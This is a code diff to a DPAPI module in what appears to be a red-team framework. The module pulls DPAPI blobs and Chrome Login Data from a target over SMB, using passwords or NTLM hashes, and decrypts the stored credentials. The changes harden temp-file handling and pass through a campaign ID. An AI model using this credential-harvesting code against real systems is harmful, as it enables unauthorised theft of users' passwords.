@@ -22,12 +22,11 @@ from __future__ import annotations
 
 import asyncio
 import os
-import tempfile
 from typing import Any
 
 from ares.core.campaign import Finding, Severity
 from ares.core.logger import audit, get_logger
-from ares.core.security import sanitize_hostname
+from ares.core.security import sanitize_hostname, secure_mkstemp
 from ares.modules.base import BaseModule, OpsecLevel
 from ares.core.tracing import trace_module
 
@@ -95,6 +94,7 @@ class DPAPIModule(BaseModule):
         nt_hash      = ctx.params.get("nt_hash", "")             # for offline decryption
         backup_key   = ctx.params.get("backup_key", "")          # domain backup key PEM
         mode         = ctx.params.get("mode", "auto")            # auto|user|backup|offline
+        campaign_id  = getattr(ctx, "campaign_id", "")
 
         # Parse NTLM hash if password looks like one
         lmhash, nthash_login = "", ""
@@ -110,7 +110,7 @@ class DPAPIModule(BaseModule):
             target=target, username=username, password=password,
             domain=domain, lmhash=lmhash, nthash_login=nthash_login,
             target_user=target_user, nt_hash=nt_hash,
-            backup_key=backup_key, mode=mode,
+            backup_key=backup_key, mode=mode, campaign_id=campaign_id,
         )
         return ModuleResult(
             status="success" if findings else "partial",
@@ -122,7 +122,8 @@ class DPAPIModule(BaseModule):
     async def run(self, target: str, username: str, password: str = "",
                   domain: str = "", lmhash: str = "", nthash_login: str = "",
                   target_user: str = "", nt_hash: str = "",
-                  backup_key: str = "", mode: str = "auto", **kwargs: Any):
+                  backup_key: str = "", mode: str = "auto",
+                  campaign_id: str = "", **kwargs: Any):
 
         await self.before_request(target, "default")
         logger.info("dpapi_start", target=target, mode=mode, target_user=target_user)
@@ -136,7 +137,8 @@ class DPAPIModule(BaseModule):
             local_files = await loop.run_in_executor(
                 None,
                 lambda: self._transfer_dpapi_files(
-                    target, username, password, domain, lmhash, nthash_login, target_user
+                    target, username, password, domain, lmhash, nthash_login,
+                    target_user, campaign_id=campaign_id
                 ),
             )
         except Exception as exc:
@@ -163,33 +165,36 @@ class DPAPIModule(BaseModule):
         # Decrypt blobs
         credentials: list[dict] = []
 
-        if mode in ("auto", "offline") and nt_hash:
-            creds = await loop.run_in_executor(
+        try:
+            if mode in ("auto", "offline") and nt_hash:
+                creds = await loop.run_in_executor(
+                    None,
+                    lambda: self._decrypt_offline(local_files, nt_hash, target_user, domain),
+                )
+                credentials.extend(creds)
+
+            if mode in ("auto", "backup") and backup_key:
+                creds = await loop.run_in_executor(
+                    None,
+                    lambda: self._decrypt_with_backup_key(local_files, backup_key),
+                )
+                credentials.extend(creds)
+
+            # Chrome Login Data — special handling via sqlite3
+            chrome_creds = await loop.run_in_executor(
                 None,
-                lambda: self._decrypt_offline(local_files, nt_hash, target_user, domain),
+                lambda: self._parse_chrome_logindata(
+                    local_files, nt_hash or nthash_login, campaign_id=campaign_id
+                ),
             )
-            credentials.extend(creds)
-
-        if mode in ("auto", "backup") and backup_key:
-            creds = await loop.run_in_executor(
-                None,
-                lambda: self._decrypt_with_backup_key(local_files, backup_key),
-            )
-            credentials.extend(creds)
-
-        # Chrome Login Data — special handling via sqlite3
-        chrome_creds = await loop.run_in_executor(
-            None,
-            lambda: self._parse_chrome_logindata(local_files, nt_hash or nthash_login),
-        )
-        credentials.extend(chrome_creds)
-
-        # Cleanup temp files
-        for fpath in local_files.values():
-            try:
-                os.unlink(fpath)
-            except Exception:
-                pass
+            credentials.extend(chrome_creds)
+        finally:
+            # Cleanup transferred credential artifacts on success, parse failure, or cancellation.
+            for fpath in local_files.values():
+                try:
+                    os.unlink(fpath)
+                except Exception:
+                    pass
 
         logger.info("dpapi_complete", found=len(credentials))
 
@@ -249,7 +254,8 @@ class DPAPIModule(BaseModule):
 
     def _transfer_dpapi_files(self, target: str, username: str, password: str,
                                domain: str, lmhash: str, nthash: str,
-                               target_user: str) -> dict[str, str]:
+                               target_user: str,
+                               campaign_id: str = "") -> dict[str, str]:
         """
         Transfer DPAPI-relevant files from target via SMB.
         Returns {logical_name: local_temp_path}.
@@ -295,15 +301,30 @@ class DPAPIModule(BaseModule):
 
         for share, remote_path, name in targets:
             buf = io.BytesIO()
+            local_path = ""
+            fd: int | None = None
             try:
                 smb.getFile(share, remote_path, buf.write)
-                _fd, local_path = tempfile.mkstemp(prefix=f"ares_dpapi_{name}_")
-                os.close(_fd)
+                local_path, fd = secure_mkstemp(
+                    prefix=f"ares_dpapi_{name}_", campaign_id=campaign_id
+                )
+                os.close(fd)
+                fd = None
                 with open(local_path, "wb") as f:
                     f.write(buf.getvalue())
                 local_files[name] = local_path
                 logger.debug("dpapi_file_transferred", name=name, size=len(buf.getvalue()))
             except Exception:
+                if fd is not None:
+                    try:
+                        os.close(fd)
+                    except OSError:
+                        pass
+                if local_path and local_path not in local_files.values():
+                    try:
+                        os.unlink(local_path)
+                    except OSError:
+                        pass
                 pass   # file not found or no access — continue
 
         try:
@@ -365,7 +386,8 @@ class DPAPIModule(BaseModule):
             return []
 
     def _parse_chrome_logindata(self, local_files: dict[str, str],
-                                 nt_hash: str) -> list[dict]:
+                                 nt_hash: str,
+                                 campaign_id: str = "") -> list[dict]:
         """
         Parse Chrome Login Data SQLite file.
         Chrome encrypts passwords with AES-256-GCM using a key stored in
@@ -381,11 +403,16 @@ class DPAPIModule(BaseModule):
             return []
 
         creds: list[dict] = []
+        tmp_db = ""
+        fd: int | None = None
         try:
             # Copy to avoid SQLite lock errors on the live DB file
             import shutil
-            _fd_tmp, tmp_db = tempfile.mkstemp(suffix=".db")
-            import os as _os_db; _os_db.close(_fd_tmp)  # mkstemp opens fd — close before shutil.copy2 overwrites
+            tmp_db, fd = secure_mkstemp(
+                suffix=".db", prefix="ares_dpapi_login_", campaign_id=campaign_id
+            )
+            os.close(fd)
+            fd = None
             shutil.copy2(login_path, tmp_db)
 
             conn = sqlite3.connect(tmp_db)
@@ -404,12 +431,19 @@ class DPAPIModule(BaseModule):
                     })
             finally:
                 conn.close()
-                try:
-                    os.unlink(tmp_db)
-                except Exception:
-                    pass
 
         except Exception as exc:
             logger.debug("chrome_parse_failed", error=str(exc)[:80])
+        finally:
+            if fd is not None:
+                try:
+                    os.close(fd)
+                except OSError:
+                    pass
+            if tmp_db:
+                try:
+                    os.unlink(tmp_db)
+                except OSError:
+                    pass
 
         return creds
